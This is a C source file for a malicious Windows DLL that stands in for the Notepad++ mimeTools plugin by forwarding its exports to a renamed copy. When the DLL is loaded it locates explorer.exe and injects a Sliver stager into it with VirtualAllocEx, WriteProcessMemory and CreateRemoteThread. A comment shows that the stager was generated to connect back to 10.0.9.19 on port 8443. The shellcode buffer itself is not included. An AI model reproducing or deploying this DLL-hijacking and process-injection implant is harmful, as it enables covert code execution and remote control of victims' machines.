#include <windows.h>
#include <tlhelp32.h>

/* Tells the linker to forward functions beNotified, getFuncsArray, etc., to the
 * mimeTools DLL */
#pragma comment(linker, "/export:beNotified=mimeTools2.beNotified")
#pragma comment(linker, "/export:getFuncsArray=mimeTools2.getFuncsArray")
#pragma comment(linker, "/export:getName=mimeTools2.getName")
#pragma comment(linker, "/export:isUnicode=mimeTools2.isUnicode")
#pragma comment(linker, "/export:messageProc=mimeTools2.messageProc")
#pragma comment(linker, "/export:setInfo=mimeTools2.setInfo")

/* Take snapshot of all processes and locate 'explorer.exe'*/
DWORD GetExplorerPID() {
    /* Take a snapshot of all processes */
    HANDLE sShot = CreateToolhelp32Snapshot(PROCESS_ALL_ACCESS, 0);
    /* 'PROCESSENTRY32W' describes an entry from 'CreateToolhelp32Snapshot' */
    PROCESSENTRY32W snapshotEntry = { 0 };
    snapshotEntry.dwSize = sizeof(snapshotEntry);
    /* Validate that process list is intact */
    if (!Process32FirstW(sShot, &snapshotEntry)) {
        return -1;
    }
    /* Loop process snapshots until 'explorer.exe' is found */
    while (Process32NextW(sShot, &snapshotEntry)) { // Loop over each process entry
        if (wcscmp(snapshotEntry.szExeFile, L"explorer.exe") == 0) {
            return snapshotEntry.th32ProcessID;
        }
    }
    /* If 'explorer.exe' is not found, return -1 to indicate so */
    return -1;
}

VOID ProcessInject() {
    /* Get PID of 'explorer.exe' and check if valid PID has been obtained */
    DWORD ePID = GetExplorerPID();
    if (ePID == -1) {
        return;
    };
    /* 'generate stager -L 10.0.9.19 -l 8443 -f c' */
    
    SIZE_T bSize = sizeof(buf);
    /* Obtain handle to 'explorer.exe' process */
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ePID);
    if (pHandle == NULL) {
        return;
    }
    /* Allocate memory within 'explorer.exe' and confirm */
    LPVOID vAddr = VirtualAllocEx(pHandle, NULL, bSize, MEM_COMMIT,
		    PAGE_EXECUTE_READWRITE);
    if (vAddr == NULL) {
        CloseHandle(pHandle);
        return;
    }
    /* Write Sliver stager to allocated memory block and confirm */
    BOOL wMem = WriteProcessMemory(pHandle, vAddr, buf, bSize, NULL);
    if (wMem == 0) {
        CloseHandle(pHandle);
        return;
    }
    /* Start a thread of execution at vAddr and confirm */
    HANDLE tHandle = CreateRemoteThread(pHandle, NULL, 0,
		    (LPTHREAD_START_ROUTINE)vAddr, NULL, 0, NULL);
    if (tHandle == NULL) {
        CloseHandle(pHandle);
        return;
    }
    /* Close handles as no longer necessary */
    CloseHandle(pHandle);
    CloseHandle(tHandle);
}

/* Entry point for the DLL */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    /* case clause that is ran upon DLL invocation */
	case DLL_PROCESS_ATTACH:
	    ProcessInject();
	    break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	    break;
    }
    return TRUE;
}
